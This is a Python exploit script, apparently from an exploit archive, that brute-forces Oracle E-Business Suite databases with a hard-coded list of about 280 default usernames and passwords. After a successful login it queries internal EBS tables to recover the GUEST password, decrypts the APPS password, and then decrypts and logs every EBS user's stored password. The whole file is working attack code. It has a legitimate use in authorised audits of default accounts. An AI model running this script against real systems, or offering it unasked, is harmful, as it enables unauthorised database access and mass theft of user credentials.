#!/usr/bin/env python
# Exploit Title: EBS DB Users Brute-force Exploit
# Date: 03/20/2018
# Exploit Author: @0xalg
# Vendor Homepage: https://ERPScan.com
# Version: 1.1
# Tested on: EBS 12.2.6, 12.2.5, 12.2.4, 12.2.3, 12.2.2

import cx_Oracle
import argparse
import ebsDecrypt
import sys
from ansicolor import red, green, blue, yellow, magenta

creds = [('ABM', 'ABM'),
        ('AD_MONITOR', 'lizard'),
        ('AHL', 'AHL'),
        ('AHM', 'AHM'),
        ('AK', 'AK'),
        ('ALR', 'ALR'),
        ('AMF', 'AMF'),
        ('AMS', 'AMS'),
        ('AMV', 'AMV'),
        ('AMW', 'AMW'),
        ('ANONYMOUS', 'anonymous'),
        ('AP', 'AP'),
        ('APPLSYS', 'APPS'),
        ('APPLSYSPUB', 'PUB'),
        ('APPS', 'APPS'),
        ('APPS_NE', 'APPS'),
        ('AR', 'AR'),
        ('ASF', 'ASF'),
        ('ASG', 'ASG'),
        ('ASL', 'ASL'),
        ('ASN', 'ASN'),
        ('ASO', 'ASO'),
        ('ASP', 'ASP'),
        ('AST', 'AST'),
        ('AX', 'AX'),
        ('AZ', 'AZ'),
        ('BEN', 'BEN'),
        ('BIC', 'BIC'),
        ('BIL', 'BIL'),
        ('BIM', 'BIM'),
        ('BIS', 'BIS'),
        ('BIV', 'BIV'),
        ('BIX', 'BIX'),
        ('BNE', 'BNE'),
        ('BOM', 'BOM'),
        ('BSC', 'BSC'),
        ('CCT', 'CCT'),
        ('CE', 'CE'),
        ('CLN', 'CLN'),
        ('CMI', 'CMI'),
        ('CN', 'CN'),
        ('CRP', 'CRP'),
        ('CS', 'CS'),
        ('CSC', 'CSC'),
        ('CSD', 'CSD'),
        ('CSE', 'CSE'),
        ('CSF', 'CSF'),
        ('CSI', 'CSI'),
        ('CSL', 'CSL'),
        ('CSM', 'CSM'),
        ('CSP', 'CSP'),
        ('CSR', 'CSR'),
        ('CSS', 'CSS'),
        ('CTXSYS', 'CTXSYS'),
        ('CUA', 'CUA'),
        ('CUE', 'CUE'),
        ('CUF', 'CUF'),
        ('CUG', 'CUG'),
        ('CUI', 'CUI'),
        ('CUN', 'CUN'),
        ('CUP', 'CUP'),
        ('CUS', 'CUS'),
        ('CZ', 'CZ'),
        ('DBSNMP', 'DBSNMP'),
        ('DDD', 'DDD'),
        ('DDR', 'DDR'),
        ('DIP', 'DIP'),
        ('DNA', 'DNA'),
        ('DOM', 'DOM'),
        ('DPP', 'DPP'),
        ('EAA', 'EAA'),
        ('EAM', 'EAM'),
        ('EC', 'EC'),
        ('ECX', 'ECX'),
        ('EDR', 'EDR'),
        ('EGO', 'EGO'),
        ('EM_MONITOR', 'EM_MONITOR'),
        ('ENG', 'ENG'),
        ('ENI', 'ENI'),
        ('EVM', 'EVM'),
        ('EXFSYS', 'EXFSYS'),
        ('EXFSYS', 'exfsysss'),
        ('FA', 'FA'),
        ('FEM', 'FEM'),
        ('FII', 'FII'),
        ('FLM', 'FLM'),
        ('FPA', 'FPA'),
        ('FPT', 'FPT'),
        ('FRM', 'FRM'),
        ('FTE', 'FTE'),
        ('FTP', 'FTP'),
        ('FUN', 'FUN'),
        ('FV', 'FV'),
        ('GCS', 'GCS'),
        ('GHG', 'GHG'),
        ('GL', 'GL'),
        ('GMA', 'GMA'),
        ('GMD', 'GMD'),
        ('GME', 'GME'),
        ('GMF', 'GMF'),
        ('GMI', 'GMI'),
        ('GML', 'GML'),
        ('GMO', 'GMO'),
        ('GMP', 'GMP'),
        ('GMS', 'GMS'),
        ('GR', 'GR'),
        ('HR', 'HR'),
        ('HRI', 'HRI'),
        ('HXC', 'HXC'),
        ('HXT', 'HXT'),
        ('IA', 'IA'),
        ('IBA', 'IBA'),
        ('IBC', 'IBC'),
        ('IBE', 'IBE'),
        ('IBP', 'IBP'),
        ('IBU', 'IBU'),
        ('IBW', 'IBW'),
        ('IBY', 'IBY'),
        ('ICX', 'ICX'),
        ('IEB', 'IEB'),
        ('IEC', 'IEC'),
        ('IEM', 'IEM'),
        ('IEO', 'IEO'),
        ('IES', 'IES'),
        ('IEU', 'IEU'),
        ('IEX', 'IEX'),
        ('IGC', 'IGC'),
        ('IGF', 'IGF'),
        ('IGI', 'IGI'),
        ('IGS', 'IGS'),
        ('IGW', 'IGW'),
        ('IMC', 'IMC'),
        ('IMT', 'IMT'),
        ('INL', 'INL'),
        ('INV', 'INV'),
        ('IP', 'IP'),
        ('IPA', 'IPA'),
        ('IPD', 'IPD'),
        ('IPM', 'IPM'),
        ('ISC', 'ISC'),
        ('ITA', 'ITA'),
        ('ITG', 'ITG'),
        ('IZU', 'IZU'),
        ('JA', 'JA'),
        ('JE', 'JE'),
        ('JG', 'JG'),
        ('JL', 'JL'),
        ('JMF', 'JMF'),
        ('JTF', 'JTF'),
        ('JTI', 'JTI'),
        ('JTM', 'JTM'),
        ('JTS', 'JTS'),
        ('LNS', 'LNS'),
        ('MDDATA', 'MDDATA'),
        ('MDSYS', 'MDSYS'),
        ('ME', 'ME'),
        ('MFG', 'MFG'),
        ('MGDSYS', 'MGDSYS'),
        ('MRP', 'MRP'),
        ('MSC', 'MSC'),
        ('MSD', 'MSD'),
        ('MSO', 'MSO'),
        ('MSR', 'MSR'),
        ('MST', 'MST'),
        ('MTH', 'MTH'),
        ('MWA', 'MWA'),
        ('ODM', 'ODM'),
        ('OE', 'OE'),
        ('OKB', 'OKB'),
        ('OKC', 'OKC'),
        ('OKE', 'OKE'),
        ('OKI', 'OKI'),
        ('OKL', 'OKL'),
        ('OKO', 'OKO'),
        ('OKR', 'OKR'),
        ('OKS', 'OKS'),
        ('OKX', 'OKX'),
        ('OLAPSYS', 'OLAPSYS'),
        ('OLAPSYS', 'no_password'),
        ('ONT', 'ONT'),
        ('OPI', 'OPI'),
        ('ORACLE_OCM', 'OCM_3XP1R3D'),
        ('ORACLE_OCM', 'ORACLE_OCM'),
        ('ORDDATA', 'ORDDATA'),
        ('ORDPLUGINS', 'ORDPLUGINS'),
        ('ORDSYS', 'ORDSYS'),
        ('OSM', 'OSM'),
        ('OTA', 'OTA'),
        ('OUTLN', 'OUTLN'),
        ('OWBSYS', 'OWBSYS'),
        ('OZF', 'OZF'),
        ('OZP', 'OZP'),
        ('OZS', 'OZS'),
        ('PA', 'PA'),
        ('PFT', 'PFT'),
        ('PJI', 'PJI'),
        ('PJM', 'PJM'),
        ('PMI', 'PMI'),
        ('PN', 'PN'),
        ('PO', 'PO'),
        ('POA', 'POA'),
        ('POM', 'POM'),
        ('PON', 'PON'),
        ('POS', 'POS'),
        ('PRP', 'PRP'),
        ('PSA', 'PSA'),
        ('PSB', 'PSB'),
        ('PSP', 'PSP'),
        ('PV', 'PV'),
        ('QA', 'QA'),
        ('QOT', 'QOT'),
        ('QP', 'QP'),
        ('QPR', 'QPR'),
        ('QRM', 'QRM'),
        ('RG', 'RG'),
        ('RHX', 'RHX'),
        ('RLA', 'RLA'),
        ('RLM', 'RLM'),
        ('RRS', 'RRS'),
        ('SI_INFORMTN_SCHEMA', 'SI_INFORMTN_SCHEMA'),
        ('SPATIAL_CSW_ADMIN_USR', 'SPATIAL_CSW_ADMIN_USR'),
        ('SPATIAL_WFS_ADMIN_USR', 'SPATIAL_WFS_ADMIN_USR'),
        ('SSP', 'SSP'),
        ('SYS', 'CHANGE_ON_INSTALL'),
        ('SYSTEM', 'MANAGER'),
        ('VEA', 'VEA'),
        ('VEH', 'VEH'),
        ('WIP', 'WIP'),
        ('WMS', 'WMS'),
        ('WMSYS', 'WMSYS'),
        ('WPS', 'WPS'),
        ('WSH', 'WSH'),
        ('WSM', 'WSM'),
        ('XDB', 'CHANGE_ON_INSTALL'),
        ('XDO', 'XDO'),
        ('XDP', 'XDP'),
        ('XLA', 'XLA'),
        ('XLE', 'XLE'),
        ('XNB', 'XNB'),
        ('XNC', 'XNC'),
        ('XNI', 'XNI'),
        ('XNM', 'XNM'),
        ('XNP', 'XNP'),
        ('XNS', 'XNS'),
        ('XTR', 'XTR'),
        ('YY', 'YY'),
        ('ZFA', 'ZFA'),
        ('ZPB', 'ZPB'),
        ('ZSA', 'ZSA'),
        ('ZX', 'ZX')]

count = 0
sqls = [
    'select decode(APPS.FND_WEB_SEC.GET_PWD_ENC_MODE, null,\'NO\',\'YES\') from dual',
    'select fnd_web_sec.get_guest_username_pwd from dual',
    'select encrypted_foundation_password from APPS.fnd_user where user_name like \'GUEST\'',
    'select user_name, encrypted_user_password from APPS.fnd_user'
]

b_hash = False

help_desc = """
EBS DB Users Brute-force python script. It tests for default DB users with the predefined passwords.
Also it can check whether any bruted DB user has possibility to decrypt EBS Users passwords 
(in the case of Password Hashing is not implemented).
"""

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-H', '--host', default='127.0.0.1', help='DB host (default: 127.0.0.1). Example: ebs.example.com')
parser.add_argument('-P', '--port', default=1521, type=int, help='DB port (default: 1521)')
parser.add_argument('-s', '--sid', default='EBSDB', help='DB SID (default: EBSDB)')
parser.add_argument('-d', '--dec', default='Y', help='Try to decrypt EBS Users Passwords? Y/N')
parser.add_argument('-f', '--file', default='dbCheckResults.txt', help='Add file name to save all results (default: dbCheckResults.txt')
parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')

def f_save(value, create=False):
    if create:
        with open(args.file, "w") as myfile:
            myfile.write("Results:\n")
    else:
        with open(args.file, "a") as myfile:
            myfile.write(value)


def f_verbose(value):
    if ("[X]" in value) or ("[+]" in value):
        f_save(value + '\n')

    col_cred = value.split('`')
    neutrino = ''

    for index, item in enumerate(col_cred):
        if index & 1:
            neutrino = neutrino + blue(item)
        else:
            neutrino += item
    if "[X]" in neutrino:
        print neutrino.replace("[X]", red("[X]"))
    elif "[+]" in neutrino:
        print neutrino.replace("[+]", yellow("[+]"))
    elif args.verbose:
        print neutrino.replace("[*]", green("[*]")).replace("[!]", magenta("[!]"))

    return


class Oracle(object):

    def __init__(self, host, port, sid):
        self.dsn = cx_Oracle.makedsn(host, port, sid)
        self.p = f_verbose

    def connect(self, username, password):
        global count

        try:
            self.db = cx_Oracle.connect(username, password, self.dsn)
        except cx_Oracle.DatabaseError as e:
            error, = e.args
            if error.code == 1017:
                self.p("[*] Wrong creds `{}`:`{}".format(username, password))
            elif error.code == 28000:
                self.p("[*] The account `{}` is locked".format(username))
            elif error.code == 1045:
                self.p("[*] User `{}` lacks CREATE SESSION privilege".format(username))
            elif error.code == 28001:
                self.p("[X] status: Found `{}` with expired password `{}`".format(username, password))
                count += 1
            else:
                print e, sys.exc_info()[0]
                self.p("[X] Something went wrong!")
                exit(1)
            return False

        self.cursor = self.db.cursor()
        return True

    def disconnect(self):
        try:
            self.cursor.close()
            self.db.close()
        except cx_Oracle.DatabaseError:
            pass

    def execute(self, sql, commit=False):
        try:
            self.cursor.execute(sql)
        except cx_Oracle.DatabaseError as e:
            error, = e.args
            print error
            raise
        if commit:
            self.db.commit()

    def select(self, sql, commit=False):
        result = None
        try:
            self.cursor.execute(sql)
            result = self.cursor.fetchall()
        except cx_Oracle.DatabaseError as e:
            error, = e.args
            self.p("[!] Database Error: failed with error code:%d" % error.code)
            raise
        if commit:
            self.db.commit()
        return result


def f_check2(db, condition):
    global b_hash
    # result = []
    if condition: # check for first time working
        return

    try:
        result = db.select(sqls[0]) # check for Hash implementation
    except cx_Oracle.DatabaseError:
        f_verbose("[!] Check cannot be performed")
        return

    if "Yes" in result[0]:
        f_verbose("[*] Hashed passwords are on")
        b_hash = True  # don't check further
    else:
        f_verbose("[X] Warning: Hashed passwords are not on")

    try:  # GET `GUEST` PASSWORD
        guest_creds = db.select(sqls[1])
        f_verbose("[*] PL/SQL 1 successful executed!")
        print "guest_password = ", guest_creds
    except cx_Oracle.DatabaseError as e:
        err, = e.args
        f_verbose("[!] 1 Something went wrong!\n".join([err.message, err.context]))
        return

    f_verbose("[x] Trying to GET `GUEST` encrypted_foundation_password")
    try:   # GET `GUEST` encrypted_foundation_password
        guestEncPwd = db.select(sqls[2])
    except cx_Oracle.DatabaseError as e:
        err, = e.args
        f_verbose("[!] 2 Something went wrong!\n".join([err.message, err.context]))
        return

    f_verbose("[x] Trying to decrypt `APPS` password")
    try:
        appsPwd = ebsDecrypt.decrypt(guest_creds[0][0], guestEncPwd[0][0])
    except:
        e = sys.exc_info()[0]
        f_verbose("[!] 3 `APPS` password decryption failed!\nError: `{}`".format(e))
        return

    try:  # get all db users encrypted passwords
        result = db.select(sqls[3])
    except cx_Oracle.DatabaseError as e:
        err, = e.args
        f_verbose("[!] 4 Something went wrong!\n".join([err.message, err.context]))
        return

    temp = 0
    for i in result:
        f_verbose("[+] Decrypted EBS `{}` user with `{}` password".format(i[0], ebsDecrypt.decrypt(appsPwd, i[1])))
        temp += 1

    f_verbose("\n[+] Total EBS users passwords decrypted: `{}` passwords.\n".format(temp))

    b_hash = True # don't try decrypt EBS users passwords again

    return


def f_check():  # check credentials
    global count, b_hash
    f_save("", True)
    oracle = Oracle(args.host, args.port, args.sid)
    # payloads = [('SI_INFORMTN_SCHEMA', 'SI_INFORMTN_SCHEMA')] # for testing

    for item in creds:
        if oracle.connect(item[0], item[1]):
            f_verbose("[X] status: Found `{} / {}`".format(item[0], item[1]))
            count += 1
            if 'Y' in args.dec:
                f_check2(oracle, b_hash)
            oracle.disconnect()

    f_verbose("\n[+] Total found: `{}` DB users with predefined passwords.\n".format(count))


if __name__ == '__main__':

    args = parser.parse_args()
    f_check()

